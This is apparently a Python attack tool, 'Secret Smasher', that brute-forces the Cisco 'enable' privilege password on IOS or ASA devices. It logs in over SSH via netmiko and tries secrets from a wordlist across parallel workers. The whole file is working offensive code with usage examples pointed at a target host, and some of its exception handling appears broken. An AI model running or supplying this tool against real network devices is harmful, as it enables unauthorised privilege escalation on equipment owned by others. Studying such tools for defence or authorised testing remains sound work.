import asyncio
import concurrent.futures
import netmiko
import pathlib

found = False
work_queue = asyncio.Queue()

red = "\x1b[31;1m"
bold = "\x1b[1m"
reset = "\x1b[0m"
green = "\x1b[32;1m"


def blocking_task_connect(device: dict, uid: int):
    """Blocking function responsible for starting the netmiko session"""
    global found
    try:
        dev = netmiko.Netmiko(**device)
        print(f'{green}[*] - Successfully connected to host {device["host"]} on worker {uid}{reset}')
        if dev.check_enable_mode():
            print(f'{green}[!] - We are currently in level 15 privilege mode!  No password?!{reset}')
            return
        secret = None
        while not found:
            if dev.check_enable_mode():
                print(f'{green}[!] - Password "{secret}" worked as the secret password!{reset}')
                found = True
                break
            dev.send_command('enable', expect_string='word', delay_factor=2)
            secret = work_queue.get_nowait()
            print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
            output = dev.send_command_timing(secret, strip_prompt=False)
            if '#' in output:
                continue
            secret = work_queue.get_nowait()
            print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
            output = dev.send_command_timing(secret, strip_prompt=False)
            if '#' in output:
                continue
            secret = work_queue.get_nowait()
            print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
            output = dev.send_command_timing(secret, strip_prompt=False)
            if '#' in output:
                continue

        print(f'{bold}[*] - Closing worker {uid}!{reset}')

    except asyncio.queues.QueueEmpty:
        pass

    except netmiko.ssh_exception:
        pass

    except netmiko.NetmikoAuthenticationException:
        print(f'{red}[x] - SSH Authentication Error using --> {device["username"]} and {device["password"]}')

    except netmiko.NetMikoTimeoutException:
        print(f'{red}[x] - SSH Connection to {device["host"]} timed out')


def return_list(filename: str) -> list:
    """Function to return file contents as a list"""
    if pathlib.Path(filename).is_file():
        return [_x.rstrip() for _x in open(filename)]
    return []


async def run_blocking_tasks(device: dict, executor: concurrent.futures.ThreadPoolExecutor):
    """Coroutine to run blocking tasks within an executor"""
    loop = asyncio.get_event_loop()
    workers = device.pop('workers')
    blocking_io = [loop.run_in_executor(executor, blocking_task_connect, device, i) for i in range(workers)]
    completed, pending = await asyncio.wait(blocking_io)
    _ = [t.result() for t in completed]


def intro():
    output: str = f"""
{red}
    ███████╗███████╗ ██████╗██████╗ ███████╗████████╗          
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝          
    ███████╗█████╗  ██║     ██████╔╝█████╗     ██║             
    ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║             
    ███████║███████╗╚██████╗██║  ██║███████╗   ██║             
    ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝             

███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{reset}

    "{bold}Everything is a secret, until it isn't" -d3d{reset}

{red}[*] - Author:     d3d (@MaliciousGroup)
{red}[*] - Version:    v1.0{reset}"""
    print(output)


def usage():
    output: str = f"""
{bold}Single Target{reset}:
  {argv[0]} -h "10.10.10.1" -u cisco -p cisco -d cisco_ios -s possible_secrets.txt
  {argv[0]} -h "10.10.10.1" -u cisco -p cisco -d cisco_ios -s /path/to/wordlist.txt -w 5

{bold}Application Options{reset}:
  '-h', '--host'        - Set the target address to the Cisco Device
  '-u', '--user'        - Set the username to the Cisco Device
  '-p', '--pass'        - Set the password to the Cisco Device
  '-d', '--device_type' - Set the Cisco device_type - Options: ['cisco_ios', 'cisco_asa']
  '-s', '--secrets'     - Set the file containing possible secrets to attempt
  '-w', '--workers'     - Set the max number of workers to run per host"""
    print(output)


if __name__ == '__main__':
    import argparse
    from sys import argv

    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='host', default='')
    parser.add_argument('-u', '--users', action='store', dest='user', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='password', default='')
    parser.add_argument('-d', '--device_type', action='store', dest='device_type', default='')
    parser.add_argument('-s', '--secrets', action='store', dest='secrets', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='1')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit(f"{red}[x] - Invalid options specified.")
    if not arg.host:
        usage()
        exit(f"{red}[x] - The 'host' option is required to start attack")
    if not arg.user:
        usage()
        exit(f"{red}[x] - The 'user' option is required to start attack")
    if not arg.password:
        usage()
        exit(f"{red}[x] - The 'password' option is required to start attack")
    if not arg.device_type:
        usage()
        exit(f"{red}[x] - The 'device_type' option is required to start attack")
    if not arg.secrets:
        usage()
        exit(f"{red}[x] - The 'secrets' option is required to start attack")
    if not arg.workers:
        arg.workers = '1'
    if arg.host and arg.user and arg.password and arg.secrets and arg.device_type:
        possible_secrets: list = return_list(str(arg.secrets))
        if len(possible_secrets) == 0:
            exit(f"{red}[x] - The 'secrets' option needs to be a file containing passwords to attempt{reset}")
        for x in possible_secrets:
            work_queue.put_nowait(x)

        intro()

        _executor = concurrent.futures.ThreadPoolExecutor()
        _device = {
            'host': arg.host,
            'username': arg.user,
            'password': arg.password,
            'device_type': arg.device_type,
            'workers': int(arg.workers)
        }
        event_loop = asyncio.get_event_loop()
        try:
            event_loop.run_until_complete(run_blocking_tasks(_device, _executor))
        except (KeyboardInterrupt, EOFError):
            print(f'{red}SIGINT or Control-C detected!  Emptying queue... give it 5 seconds to close.{reset}')
            while work_queue.empty() is not True:
                try:
                    stub = work_queue.get_nowait()
                    work_queue.task_done()
                except asyncio.queues.QueueEmpty:
                    pass
